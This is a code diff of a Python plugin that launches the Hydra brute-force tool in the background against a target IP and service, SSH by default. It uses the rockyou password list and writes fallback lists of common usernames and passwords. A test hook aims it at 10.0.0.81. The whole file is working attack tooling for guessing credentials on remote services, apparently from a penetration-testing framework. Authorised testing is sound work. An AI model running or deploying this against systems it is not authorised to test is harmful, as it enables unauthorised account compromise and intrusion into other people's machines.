@@ -7,63 +7,52 @@
 # gzip -d /usr/share/wordlists/rockyou.txt.gz
 
 
+# plugins/hydra_plugin.py
+
 import os
 import time
 import subprocess
 from pathlib import Path
+from plugins.utils.errors import safe_open
 
 def run_hydra_attack(
-    target_ip: str,
-    service: str = "ssh",
-    login_file: str = "/usr/share/wordlists/usernames.txt",
-    pass_file: str = "/usr/share/wordlists/rockyou.txt",
-    log_dir: str = "logs/hydra"
-) -> dict:
+    target_ip,
+    service="ssh",
+    login_file="/usr/share/wordlists/usernames.txt",
+    pass_file="/usr/share/wordlists/rockyou.txt",
+    log_dir="logs/hydra"
+):
     """
-    Launches Hydra as a background brute-force attack.
+    Launches Hydra brute-force tool against a target IP/service using specified wordlists.
 
     Args:
-        target_ip (str): The IP address of the target system.
-        service (str): The service to attack (default: "ssh").
-        login_file (str): Path to a file with a list of usernames.
-        pass_file (str): Path to a file with a list of passwords.
-        log_dir (str): Directory to store the Hydra log file.
+        target_ip (str): The IP address of the target.
+        service (str): Service to attack (e.g., ssh, ftp).
+        login_file (str): Path to the usernames wordlist.
+        pass_file (str): Path to the passwords wordlist.
+        log_dir (str): Directory for log file output.
 
     Returns:
-        dict: A structured result containing:
-              - 'tool': Tool name
-              - 'log': Path to log file (if successful)
-              - 'target': IP address targeted
-              - 'service': Service targeted
-              - 'timestamp': When launched
-              - 'cmd': Executed command
-              - 'error': Optional error string (if failure occurred)
+        dict: Metadata about the scan including log path and error status if any.
     """
     Path(log_dir).mkdir(parents=True, exist_ok=True)
     timestamp = int(time.time())
     log_path = os.path.join(log_dir, f"hydra_{target_ip}_{timestamp}.log")
 
-    # Auto-fallback: generate sample login/password files if missing
-    try:
-        if not os.path.exists(login_file):
-            Path(login_file).parent.mkdir(parents=True, exist_ok=True)
+    # Create fallback wordlists if missing
+    if not os.path.exists(login_file):
+        try:
             with open(login_file, "w") as f:
-                f.write("root\nadmin\nuser\n")
+                f.write("root\nadmin\nguest\n")
+        except Exception as e:
+            return {"error": f"Failed to write fallback login_file: {e}"}
 
-        if not os.path.exists(pass_file):
-            Path(pass_file).parent.mkdir(parents=True, exist_ok=True)
+    if not os.path.exists(pass_file):
+        try:
             with open(pass_file, "w") as f:
-                f.write("password\n123456\nadmin\n")
-    except Exception as file_err:
-        return {
-            "tool": "hydra",
-            "target": target_ip,
-            "service": service,
-            "timestamp": timestamp,
-            "cmd": None,
-            "log": None,
-            "error": f"File setup error: {file_err}"
-        }
+                f.write("123456\npassword\nadmin\n")
+        except Exception as e:
+            return {"error": f"Failed to write fallback pass_file: {e}"}
 
     cmd = [
         "nohup", "hydra",
@@ -73,40 +62,35 @@ def run_hydra_attack(
         "-o", log_path
     ]
 
+    result = {
+        "log": log_path,
+        "target": target_ip,
+        "service": service,
+        "timestamp": timestamp,
+        "launched": False,
+        "error": None
+    }
+
     try:
-        subprocess.Popen(
-            cmd,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-            preexec_fn=os.setpgrp  # Run in new process group
-        )
-
-        print(f"[hydra_plugin] Hydra attack launched on {target_ip}:{service}, logging to {log_path}")
-
-        return {
-            "tool": "hydra",
-            "log": log_path,
-            "target": target_ip,
-            "service": service,
-            "timestamp": timestamp,
-            "cmd": " ".join(cmd)
-        }
-
+        with safe_open(log_path, "w") as logfile:
+            subprocess.Popen(
+                cmd,
+                stdout=logfile,
+                stderr=subprocess.STDOUT,
+                preexec_fn=os.setpgrp
+            )
+        result["launched"] = True
+        print(f"[hydra_plugin] Hydra attack launched on {target_ip}:{service}, log → {log_path}")
     except Exception as e:
-        print(f"[hydra_plugin] Failed to launch Hydra: {e}")
-        return {
-            "tool": "hydra",
-            "log": None,
-            "target": target_ip,
-            "service": service,
-            "timestamp": timestamp,
-            "cmd": " ".join(cmd),
-            "error": str(e)
-        }
+        result["error"] = f"Hydra failed: {e}"
+        print(f"[hydra_plugin] Error launching Hydra: {e}")
 
-# Optional test hook
+    return result
+
+# Optional standalone test
 if __name__ == "__main__":
-    run_hydra_attack("10.0.0.81")
+    print(run_hydra_attack("10.0.0.81"))
+
 
 
 
